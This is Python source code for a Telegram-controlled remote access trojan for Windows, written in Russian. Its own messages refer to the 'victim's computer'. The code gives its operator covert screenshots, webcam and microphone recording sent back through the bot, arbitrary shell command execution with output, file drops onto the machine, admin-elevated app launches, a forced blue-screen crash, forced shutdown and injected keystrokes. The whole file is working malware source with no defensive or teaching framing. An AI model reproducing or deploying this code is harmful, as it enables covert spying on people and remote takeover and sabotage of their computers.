# noinspection PyUnresolvedReferences
import os
from moviepy import AudioFileClip, VideoFileClip
import telebot
import tempfile
import ctypes
import cv2
import threading
import pyaudio
import wave
from telebot.types import Message
import requests
import subprocess
import webbrowser
import chardet
from PIL import ImageGrab
from telebot.types import ReplyKeyboardMarkup, KeyboardButton




API = ''

bot = telebot.TeleBot(API)

user_id = ''

user_data = {}
INPUT_DURATION = 0

def new_target():
    bot.send_message(user_id, 'Программа запущена')
    print('started')

new_target()

def record_video(duration):
    cap = cv2.VideoCapture(0)
    video_frames = []
    
    frames_to_record = duration * 30
    frames_recorded = 0

    while frames_recorded < frames_to_record:
        ret, frame = cap.read()
        if ret:
            video_frames.append(frame)
            frames_recorded += 1
        
    cap.release()  

    out = cv2.VideoWriter("temp_video.avi", cv2.VideoWriter_fourcc(*"XVID"), 30, (640, 480))
    for frame in video_frames:
        out.write(frame)
    out.release()  

def record_audio(filename, duration=10):
    CHUNK = 1024
    FORMAT = pyaudio.paInt16
    CHANNELS = 1
    RATE = 44100

    audio = pyaudio.PyAudio()

    stream = audio.open(format=FORMAT,
                        channels=CHANNELS,
                        rate=RATE,
                        input=True,
                        frames_per_buffer=CHUNK)

    frames = []

    print("Запись началась...")
    for _ in range(int(RATE / CHUNK * duration)):
        data = stream.read(CHUNK)
        frames.append(data)

    print("Запись завершена.")
    stream.stop_stream()
    stream.close()
    audio.terminate()

    print('Настройка видео...')
    wf = wave.open(filename, "wb")
    wf.setnchannels(CHANNELS)
    wf.setsampwidth(audio.get_sample_size(FORMAT))
    wf.setframerate(RATE)
    wf.writeframes(b"".join(frames))
    wf.close()


@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.send_message(message.chat.id, 'Привет! Что вы хотите сделать?', reply_markup=create_text_keyboard())

def send_screenshot(message):
    print('Делаю скриншот...')
    path = tempfile.gettempdir() + '/screenshot.png'
    screenshot = ImageGrab.grab()
    screenshot.save(path, 'PNG')
    bot.send_photo(message.chat.id, open(path, 'rb'))


def open_website(message: Message):
    print('Открываю сайт...')
    url = message.text
    if url.startswith('http://') or url.startswith('https://'):
        webbrowser.open(url)
        bot.send_message(message.chat.id, f'Открыт браузер на компьютере жертвы со страницей: {url}')
    else:
        search_request = message.text
        url = f"https://www.google.com/search?q={search_request}"
        webbrowser.open(url)
        bot.send_message(message.chat.id, f'Открыт браузер на компьютере жертвы с запросом: {search_request}')


@bot.message_handler(func=lambda message: True)
def handle_text_commands(message):
    command = message.text
    if command == 'Скриншот экрана':
        bot.send_message(message.chat.id, 'Делаю скриншот экрана...')
        send_screenshot(message)
    elif command == 'Выключить ПК':
        bot.send_message(message.chat.id, 'Выключаю...')
        os.system('shutdown -s -t 0')
    elif command == 'Перезагрузить ПК':
        bot.send_message(message.chat.id, 'Перезагружаю...')
        os.system('shutdown -r -t 0')
    elif command == 'Вызвать BSOD':
        bot.send_message(message.chat.id, 'Вызываю синий экран смерти...')
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
        ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.c_ulong()))
    elif command == 'Узнать IP компьютера':
        bot.send_message(message.chat.id, 'Ищу IP ПК...')
        get_computer_ip(message)
    elif command == 'Вывести СМС на экран':
        bot.send_message(message.chat.id, 'Введите сообщение для отображения на экране ПК:')
        bot.register_next_step_handler(message, show_messagebox)
    elif command == 'Загуглить на ПК':
        bot.send_message(message.chat.id, 'Введите запрос для поиска в Google или URL:')
        bot.register_next_step_handler(message, open_website)
    elif command == 'Команда CMD':
        bot.send_message(message.chat.id, 'Введите команду для выполнения в CMD:')
        bot.register_next_step_handler(message, execute_command)
    elif command == 'Загрузить файл на ПК':
        bot.send_message(message.chat.id, 'Введите путь для сохранения файла на компьютере:')
        bot.register_next_step_handler(message, download_file)
    elif command == 'Коннект к веб камере':
        bot.send_message(message.chat.id, 'Введите, сколько времени записывать видео c камеры (в секундах):')
        bot.register_next_step_handler(message, start_video_and_audio_recording)
    elif command == 'Клавиатура':
        bot.register_next_step_handler(message, sendkeys)
    elif command in ['Backspace', 'Tab', 'Enter', 'Caps Lock', 'Esc', '↑', '↓', '←', '→', 'Pause/Break', 'Delete', 'End', 'Home', 'Num Lock', 'Page Up', 'Page Down', 'Scroll Lock', 'Print Screen', 'Insert', 'Win']:
        if command == 'Backspace':
            os.system('echo >script.vbs set shell = CreateObject("WScript.Shell"):shell.SendKeys "{BS}" & script.vbs')
        if command == 'Tab':
            os.system('echo >script.vbs set shell = CreateObject("WScript.Shell"):shell.SendKeys "{TAB}" & script.vbs')
        if command == 'Enter':
            os.system('echo >script.vbs set shell = CreateObject("WScript.Shell"):shell.SendKeys "~" & script.vbs')
        if command == 'Caps Lock':
            os.system('echo >script.vbs set shell = CreateObject("WScript.Shell"):shell.SendKeys "{CAPSLOCK}" & script.vbs')
        if command == 'Esc':
            os.system('echo >script.vbs set shell = CreateObject("WScript.Shell"):shell.SendKeys "{ESC}" & script.vbs')
        if command == '↑':
            os.system('echo >script.vbs set shell = CreateObject("WScript.Shell"):shell.SendKeys "{UP}" & script.vbs')
        if command == '↓':
            os.system('echo >script.vbs set shell = CreateObject("WScript.Shell"):shell.SendKeys "{DOWN}" & script.vbs')
        if command == '←':
            os.system('echo >script.vbs set shell = CreateObject("WScript.Shell"):shell.SendKeys "{LEFT}" & script.vbs')
        if command == '→':
            os.system('echo >script.vbs set shell = CreateObject("WScript.Shell"):shell.SendKeys "{RIGHT}" & script.vbs')
        if command == 'Pause/Break':
            os.system('echo >script.vbs set shell = CreateObject("WScript.Shell"):shell.SendKeys "{BREAK}" & script.vbs')
        if command == 'Delete':
            os.system('echo >script.vbs set shell = CreateObject("WScript.Shell"):shell.SendKeys "{DEL}" & script.vbs')
        if command == 'End':
            os.system('echo >script.vbs set shell = CreateObject("WScript.Shell"):shell.SendKeys "{END}" & script.vbs')
        if command == 'Home':
            os.system('echo >script.vbs set shell = CreateObject("WScript.Shell"):shell.SendKeys "{HOME}" & script.vbs')
        if command == 'Num Lock':
            os.system('echo >script.vbs set shell = CreateObject("WScript.Shell"):shell.SendKeys "{NUMLOCK}" & script.vbs')
        if command == 'Page Up':
            os.system('echo >script.vbs set shell = CreateObject("WScript.Shell"):shell.SendKeys "{PGUP}" & script.vbs')
        if command == 'Page Down':
            os.system('echo >script.vbs set shell = CreateObject("WScript.Shell"):shell.SendKeys "{PGDN}" & script.vbs')
        if command == 'Scroll Lock':
            os.system('echo >script.vbs set shell = CreateObject("WScript.Shell"):shell.SendKeys "{SCROLLLOCK}" & script.vbs') 
        if command == 'Print Screen':
            os.system('echo >script.vbs set shell = CreateObject("WScript.Shell"):shell.SendKeys "{PRTSC}" & script.vbs') 
        if command == 'Insert':
            os.system('echo >script.vbs set shell = CreateObject("WScript.Shell"):shell.SendKeys "{INSERT}" & script.vbs')
        if command == 'Win':
            os.system('echo >script.vbs set shell = CreateObject("WScript.Shell"):shell.SendKeys "^{ESC}" & script.vbs') 
        bot.send_message(message.chat.id, f'Нажата клавиша: {command}')
        return
    elif command == 'Горячие клавиши':
        bot.register_next_step_handler(message, hotkeys)
    elif command in ['Ctrl + Shift + Esc', 'Alt + Shift', 'Alt + F4', 'Alt + Tab',]:
        if command == 'Ctrl + Shift + Esc':
            os.system('echo >script.vbs set shell = CreateObject("WScript.Shell"):shell.SendKeys "^+{ESC}" & script.vbs')
        if command == 'Alt + Shift':
            os.system('echo >script.vbs set shell = CreateObject("WScript.Shell"):shell.SendKeys "%+" & script.vbs')
        if command == 'Alt + F4':
            os.system('echo >script.vbs set shell = CreateObject("WScript.Shell"):shell.SendKeys "%{F4}" & script.vbs')
        if command == 'Alt + Tab':
            os.system('echo >script.vbs set shell = CreateObject("WScript.Shell"):shell.SendKeys "%{TAB}" & script.vbs')
    elif command == 'Написать клавиатурой':
        bot.send_message(message.chat.id, 'Напишите сообщение:')
        bot.register_next_step_handler(message, write_keyboard)


def write_keyboard(message):
    # Экранирование специальных символов для SendKeys
    escape_chars = {'+': '{+}', '^': '{^}', '%': '{%}', '~': '{~}', '(': '{(}', ')': '{)}'}
    escaped_text = ''.join(escape_chars.get(c, c) for c in message.text)
    
    # Формирование команды с двойным экранированием для командной строки
    cmd = f'mshta "javascript:new ActiveXObject(\'WScript.Shell\').SendKeys(unescape(\'{escaped_text.encode("unicode_escape").decode()}\'));close()"'
    
    # Запуск команды
    os.system(cmd)

def create_text_keyboard():
    keyboard = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    keyboard.add(
        KeyboardButton('Скриншот экрана'),
        KeyboardButton('Выключить ПК'),
        KeyboardButton('Перезагрузить ПК'),
        KeyboardButton('Вызвать BSOD'),
        KeyboardButton('Коннект к веб камере'),
        KeyboardButton('Узнать IP компьютера'),
        KeyboardButton('Вывести СМС на экран'),
        KeyboardButton('Загуглить на ПК'),
        KeyboardButton('Команда CMD'),
        KeyboardButton('Загрузить файл на ПК'),
        KeyboardButton('Клавиатура'),
        KeyboardButton('Горячие клавиши'),
        KeyboardButton('Написать клавиатурой'),
    )
    return keyboard

def create_sendkeys_keyboard():
    keyboard = ReplyKeyboardMarkup(row_width=4, resize_keyboard=True)
    keyboard.add(
        KeyboardButton('Win'),
        KeyboardButton('Backspace'),
        KeyboardButton('Tab'),
        KeyboardButton('Enter'),
        KeyboardButton('Caps Lock'),
        KeyboardButton('Esc'),
        KeyboardButton('Pause/Break'),
        KeyboardButton('Delete'),
        KeyboardButton('End'),
        KeyboardButton('Home'),
        KeyboardButton('Num Lock'),
        KeyboardButton('Page Up'),
        KeyboardButton('Page Down'),
        KeyboardButton('Scroll Lock'),
        KeyboardButton('Print Screen'),
        KeyboardButton('Insert'),
        KeyboardButton('↑'),
        KeyboardButton('↓'),
        KeyboardButton('←'),
        KeyboardButton('→'),
    )
    return keyboard

def sendkeys(message):
    bot.send_message(message.chat.id, 'Выберите клавишу', reply_markup=create_sendkeys_keyboard())

def create_hotkeys_keyboard():
    keyboard = ReplyKeyboardMarkup(row_width=4, resize_keyboard=True)
    keyboard.add(
        KeyboardButton('Ctrl + Shift + Esc'),
        KeyboardButton('Alt + Shift'),
        KeyboardButton('Alt + F4'),
        KeyboardButton('Alt + Tab'),
    )
    return keyboard

def hotkeys(message):
    bot.send_message(message.chat.id, 'Выберите сочетание клавиш:', reply_markup=create_hotkeys_keyboard())


def start_video_and_audio_recording(message: Message):
    try:
        duration = int(message.text)
        if duration < 1:
            bot.send_message(message.chat.id, 'Некорректное время. Введите положительное число больше 0.')
            return

        bot.send_message(message.chat.id, f'Подключаюсь к камере и записываю видео и аудио в течение {duration} секунд...')

        video_thread = threading.Thread(target=record_video, args=(duration,))
        audio_thread = threading.Thread(target=record_audio, args=("temp_audio.wav", duration))

        video_thread.start()
        audio_thread.start()

        video_thread.join()
        audio_thread.join()
        
        bot.send_message(message.chat.id, 'Записи завершены. Объединяю аудио и видео...')
        
  
        video_clip = VideoFileClip("temp_video.avi")
        audio_clip = AudioFileClip("temp_audio.wav")
        final_clip = video_clip.set_audio(audio_clip)
        final_clip.write_videofile("final_video.mp4", codec="libx264")

        bot.send_message(message.chat.id, 'Видео готово! Отправляю...')
        with open("final_video.mp4", "rb") as video_file:
            bot.send_video(message.chat.id, video_file)


        os.remove("temp_video.avi")
        os.remove("temp_audio.wav")
        os.remove("final_video.mp4")

    except ValueError:
        bot.send_message(message.chat.id, 'Некорректное время. Введите положительное число.')

def record_audio_duration(message: Message):
    try:
        duration = int(message.text)
        if duration < 1:
            bot.send_message(message.chat.id, 'Некорректное время. Введите положительное число больше 0.')
            return

        bot.send_message(message.chat.id, f'Записываю звук в течение {duration} секунд...')

        audio_thread = threading.Thread(target=record_audio, args=("temp_audio.wav", duration))
        audio_thread.start()
        audio_thread.join()

        bot.send_message(message.chat.id, 'Запись завершена. Отправляю...')

        bot.send_chat_action(message.chat.id, 'record_audio')
        with open("temp_audio.wav", "rb") as audio_file:
            bot.send_voice(message.chat.id, audio_file)

        os.remove("temp_audio.wav")

    except ValueError:
        bot.send_message(message.chat.id, 'Некорректное время. Введите положительное число.')


# noinspection PyBroadException,PyUnusedLocal
def get_computer_ip(message):
    try:
        response = requests.get('https://api.ipify.org?format=json')
        if response.status_code == 200:
            data = response.json()
            ip_address = data['ip']
            bot.send_message(message.chat.id, f'IP компьютера: {ip_address}')
        else:
            bot.send_message(message.chat.id, 'Не удалось получить IP компьютера.')
    except Exception as e:
        bot.send_message(message.chat.id, 'Произошла ошибка при получении IP компьютера.')

def show_messagebox(message: Message):
    cmd = f'msg * {message.text}'
    subprocess.run(cmd, shell=True)

    bot.send_message(message.chat.id, f'Сообщение {message} было получено.')

def execute_command(message: Message):
    try:
        command = message.text

        standard_apps = {
            "notepad": "notepad.exe",
            "calc": "calc.exe",
            "cmd": "cmd.exe",
            "pwsh": "pwsh.exe",
        }

        if command.lower() in standard_apps:
            app_name = command.lower()
            app_path = standard_apps[app_name]

            if os.name == "nt":
                try:
                    ctypes.windll.shell32.ShellExecuteW(None, "runas", app_path, None, None, 1)
                    bot.send_message(message.chat.id, f'{app_name.capitalize()} запущено с правами администратора!')
                except Exception as e:
                    bot.send_message(message.chat.id, f'Ошибка при запуске с правами администратора: {e}')
        else:
            result = subprocess.check_output(command, shell=True)
            encoding = chardet.detect(result)['encoding']
            result = result.decode(encoding, errors='replace')
            bot.send_message(message.chat.id, f'Результат выполнения команды:\n\n{result}')
    except subprocess.CalledProcessError as e:
        bot.send_message(message.chat.id, f'Ошибка выполнения команды: {e}')
    except Exception as e:
        bot.send_message(message.chat.id, f'Произошла ошибка: {e}')


def ask_file_path(message: Message):
    bot.send_message(message.chat.id, 'Введите путь для сохранения файла на компьютере:')
    bot.register_next_step_handler(message, download_file)

def download_file(message: Message):
    file_path = message.text.strip()

    if not os.path.exists(file_path):
        bot.send_message(message.chat.id, 'Указанный путь не существует. Пожалуйста, введите корректный путь:')
        bot.register_next_step_handler(message, download_file)
        return

    if not os.path.isdir(file_path):
        bot.send_message(message.chat.id, 'Указанный путь не является директорией. Пожалуйста, введите путь к существующей директории:')
        bot.register_next_step_handler(message, download_file)
        return

    bot.send_message(message.chat.id, 'Отправьте мне файл для загрузки на компьютер.')
    bot.register_next_step_handler(message, save_file, file_path)

def save_file(message: Message, file_path: str):
    if message.document:
        try:
            file_info = bot.get_file(message.document.file_id)
            downloaded_file = bot.download_file(file_info.file_path)

            file_name = os.path.basename(file_info.file_path)
            file_full_path = os.path.join(file_path, file_name)

            with open(file_full_path, 'wb') as file:
                file.write(downloaded_file)

            bot.send_message(message.chat.id, f'Файл успешно сохранен по пути: {file_full_path}')
        except Exception as e:
            bot.send_message(message.chat.id, f'Произошла ошибка при сохранении файла: {e}')
    else:
        bot.send_message(message.chat.id, 'Пожалуйста, отправьте материал из раздела "файл".')
        bot.register_next_step_handler(message, save_file, file_path)





bot.infinity_polling()